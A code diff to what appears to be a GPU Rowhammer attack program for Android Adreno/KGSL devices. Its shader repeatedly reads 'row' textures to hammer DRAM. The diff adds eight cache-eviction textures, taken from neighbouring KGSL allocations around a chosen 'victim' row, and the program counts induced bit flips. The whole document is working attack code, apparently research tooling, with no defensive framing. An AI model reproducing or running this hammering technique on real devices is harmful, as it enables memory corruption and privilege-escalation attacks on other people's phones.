@@ -173,6 +173,14 @@ const char *hammeringShaderSource = "#version 300 es\n"
 	"uniform int border;\n"
 	"layout (location = 0) in vec3 threadD;\n"
 	"uniform sampler2D evict1;\n" //  has size of 64 regular pages, needed to evict caches
+	"uniform sampler2D evict2;\n" //  has size of 64 regular pages, needed to evict caches
+	"uniform sampler2D evict3;\n" //  has size of 64 regular pages, needed to evict caches
+	"uniform sampler2D evict4;\n" //  has size of 64 regular pages, needed to evict caches
+	"uniform sampler2D evict5;\n" //  has size of 64 regular pages, needed to evict caches
+	"uniform sampler2D evict6;\n" //  has size of 64 regular pages, needed to evict caches
+	"uniform sampler2D evict7;\n" //  has size of 64 regular pages, needed to evict caches
+	"uniform sampler2D evict8;\n" //  has size of 64 regular pages, needed to evict caches
+	"uniform sampler2D evict9;\n" //  has size of 64 regular pages, needed to evict caches
 	"out vec4 FragColor;\n"
 	"void main(){\n"
 	"	int id = int(threadD.x) % 8;\n"
@@ -181,8 +189,29 @@ const char *hammeringShaderSource = "#version 300 es\n"
 	"		FragColor += texelFetch(row1, ivec2( 0, 0), 0);\n"
 	"		FragColor += texelFetch(row2, ivec2(0,0), 0);\n"
 	"		\n"
-	"		FragColor += texelFetch(evict1, ivec2(32 * id, 0), 0);\n"
-	"		FragColor += texelFetch(evict1, ivec2(32 * id, 2), 0);\n"
+	"		FragColor += texelFetch(evict1, ivec2(0, 0), 0);\n"
+	"		FragColor += texelFetch(evict1, ivec2(0, 2), 0);\n"
+
+	"		FragColor += texelFetch(evict2, ivec2(0, 0), 0);\n"
+	"		FragColor += texelFetch(evict2, ivec2(0, 2), 0);\n"
+
+	"		FragColor += texelFetch(evict3, ivec2(0, 0), 0);\n"
+	"		FragColor += texelFetch(evict3, ivec2(0, 2), 0);\n"
+
+	"		FragColor += texelFetch(evict4, ivec2(0, 0), 0);\n"
+	"		FragColor += texelFetch(evict4, ivec2(0, 2), 0);\n"
+
+	"		FragColor += texelFetch(evict5, ivec2(0, 0), 0);\n"
+	"		FragColor += texelFetch(evict5, ivec2(0, 2), 0);\n"
+
+	"		FragColor += texelFetch(evict6, ivec2(0, 0), 0);\n"
+	"		FragColor += texelFetch(evict6, ivec2(0, 2), 0);\n"
+
+	"		FragColor += texelFetch(evict7, ivec2(0, 0), 0);\n"
+	"		FragColor += texelFetch(evict7, ivec2(0, 2), 0);\n"
+
+	"		FragColor += texelFetch(evict8, ivec2(0, 0), 0);\n"
+	"		FragColor += texelFetch(evict8, ivec2(0, 2), 0);\n"
 	"	}\n"
 	//"	FragColor = vec4(0.0, 0.0, 1.0, 1.0);\n"
 	"}\n\0";
@@ -526,21 +555,23 @@ int main(){
 	int bitflips = 0;
 	for(size_t i = 0; i < cont_kgsls; ++i){
 		// preparing program to run
+		struct kgsl_entry* evictarr[8];
 		struct kgsl_entry* row1 = kgsl_result[i];
-		for(int j = 0; j < 16; ++j){
-			row1 = row1->kgsl_next;
-		}
+		// for(int j = 0; j < 16; ++j){
+		// 	row1 = row1->kgsl_next;
+		// }
 
 		struct kgsl_entry* victim = row1;
 		for(int j = 0; j < 16; ++j){
 			victim = victim->kgsl_next;
+			if( j < 8)
+				evictarr[j] = victim;
 		}
 
 		struct kgsl_entry* row2 = victim;
 		for(int j = 0; j < 16; ++j){
 			row2 = row2->kgsl_next;
 		}
-
 		
 		for( int k = 0; k < 32; ++k){
 			// Hammering two rows...
@@ -553,12 +584,10 @@ int main(){
 			// Binding textures
 			GLuint row1TexLocation = glGetUniformLocation(shaderProgram2, "row1");
 			GLuint row2TexLocation  = glGetUniformLocation(shaderProgram2, "row2");
-			GLuint evictionTexLocation  = glGetUniformLocation(shaderProgram2, "evict1");
 
 
 			glUniform1i(row1TexLocation, 0);
 			glUniform1i(row2TexLocation,  1);
-			glUniform1i(evictionTexLocation,  2);
 
 			glActiveTexture(GL_TEXTURE0 + 0); // Row1 Texture Unit
 			glBindTexture(GL_TEXTURE_2D, row1->kgsl_id);
@@ -567,8 +596,55 @@ int main(){
 			glActiveTexture(GL_TEXTURE0 + 1); // Row2 Texture Unit
 			glBindTexture(GL_TEXTURE_2D, row2->kgsl_id);
 
+
+
+			GLuint evictionTexLocation  = glGetUniformLocation(shaderProgram2, "evict1");
+			glUniform1i(evictionTexLocation,  2);
 			glActiveTexture(GL_TEXTURE0 + 2); // eviction Texture Unit
-			glBindTexture(GL_TEXTURE_2D, tex2[EVICTTEXT]);
+			glBindTexture(GL_TEXTURE_2D, evictarr[0]->kgsl_id);
+			
+
+			evictionTexLocation  = glGetUniformLocation(shaderProgram2, "evict2");
+			glUniform1i(evictionTexLocation,  3);
+			glActiveTexture(GL_TEXTURE0 + 3); // eviction Texture Unit
+			glBindTexture(GL_TEXTURE_2D, evictarr[1]->kgsl_id);
+			
+
+			evictionTexLocation  = glGetUniformLocation(shaderProgram2, "evict3");
+			glUniform1i(evictionTexLocation,  4);
+			glActiveTexture(GL_TEXTURE0 + 4); // eviction Texture Unit
+			glBindTexture(GL_TEXTURE_2D, evictarr[2]->kgsl_id);
+			
+
+			evictionTexLocation  = glGetUniformLocation(shaderProgram2, "evict4");
+			glUniform1i(evictionTexLocation,  5);
+			glActiveTexture(GL_TEXTURE0 + 5); // eviction Texture Unit
+			glBindTexture(GL_TEXTURE_2D, evictarr[3]->kgsl_id);
+			
+
+			evictionTexLocation  = glGetUniformLocation(shaderProgram2, "evict5");
+			glUniform1i(evictionTexLocation,  6);
+			glActiveTexture(GL_TEXTURE0 + 6); // eviction Texture Unit
+			glBindTexture(GL_TEXTURE_2D, evictarr[4]->kgsl_id);
+			
+
+			evictionTexLocation  = glGetUniformLocation(shaderProgram2, "evict6");
+			glUniform1i(evictionTexLocation,  7);
+			glActiveTexture(GL_TEXTURE0 + 7); // eviction Texture Unit
+			glBindTexture(GL_TEXTURE_2D, evictarr[5]->kgsl_id);
+			
+
+			evictionTexLocation  = glGetUniformLocation(shaderProgram2, "evict7");
+			glUniform1i(evictionTexLocation,  8);
+			glActiveTexture(GL_TEXTURE0 + 8); // eviction Texture Unit
+			glBindTexture(GL_TEXTURE_2D, evictarr[6]->kgsl_id);
+			
+
+			evictionTexLocation  = glGetUniformLocation(shaderProgram2, "evict8");
+			glUniform1i(evictionTexLocation,  9);
+			glActiveTexture(GL_TEXTURE0 + 9); // eviction Texture Unit
+			glBindTexture(GL_TEXTURE_2D, evictarr[7]->kgsl_id);
+			
 			printf("Trying to hammer chunk %d : %d\n", i, k);
 			
 			row1TexLocation = glGetUniformLocation(shaderProgram2, "border");;
